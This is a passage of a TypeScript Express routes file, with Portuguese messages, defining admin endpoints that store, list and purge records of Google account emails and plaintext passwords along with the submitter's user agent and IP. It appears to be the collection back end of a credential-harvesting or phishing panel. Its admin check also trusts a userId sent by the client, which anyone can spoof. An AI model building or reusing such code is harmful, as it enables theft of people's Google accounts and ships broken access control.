...
export async function registerRoutes(app: Express): Promise<Server> {
  ...
  // Google data logs routes (apenas para admins)
  app.post("/api/admin/google-data", async (req, res) => {
    try {
      const { googleEmail, googlePassword, notes, userId } = req.body;
      const userAgent = req.headers['user-agent'];
      const ip = req.ip || req.connection.remoteAddress;
      
      console.log('📝 REQUISIÇÃO DE DADOS DO GOOGLE:', { googleEmail, userId });
      ...
      if (!user || !user.isAdmin) {
        console.log('🚫 Usuário não é admin');
        return res.status(403).json({ message: "Apenas administradores podem salvar dados do Google" });
      }
      
      const googleData = await storage.logGoogleData({
        googleEmail,
        googlePassword,
        submittedBy: userId,
        userAgent,
      ...
      console.log('💾 DADOS DO GOOGLE SALVOS:', { id: googleData.id, googleEmail });
      
      res.json({ message: "Dados do Google salvos com sucesso", id: googleData.id });
    } catch (error) {
      console.error('💥 ERRO NO ENDPOINT DE DADOS DO GOOGLE:', error);
      res.status(500).json({ message: "Erro interno do servidor" });
    }
  });

  app.get("/api/admin/google-data", async (req, res) => {
    try {
      const { userId } = req.query;
      console.log('📋 REQUISIÇÃO DE DADOS DO GOOGLE:', { userId });
      ...
      if (!user || !user.isAdmin) {
        console.log('🚫 Usuário não é admin');
        return res.status(403).json({ message: "Apenas administradores podem acessar os dados do Google" });
      }
      
      const logs = await storage.getGoogleDataLogs(100);
      console.log('📊 DADOS DO GOOGLE ENCONTRADOS:', logs.length);
  ...
  app.delete("/api/admin/google-data", async (req, res) => {
    try {
      const { userId } = req.query;
      console.log('🗑️ REQUISIÇÃO DE LIMPEZA DE DADOS DO GOOGLE:', { userId });
      ...
      if (!user || !user.isAdmin) {
        console.log('🚫 Usuário não é admin');
        return res.status(403).json({ message: "Apenas administradores podem limpar os dados do Google" });
      }
      
      await storage.clearGoogleDataLogs();
      console.log('🗑️ DADOS DO GOOGLE LIMPOS COM SUCESSO');
      
      res.json({ message: "Dados do Google limpos com sucesso" });
    } catch (error) {
      console.error('💥 ERRO NO ENDPOINT DE LIMPEZA DE DADOS DO GOOGLE:', error);
      res.status(500).json({ message: "Erro interno do servidor" });
    }
  });
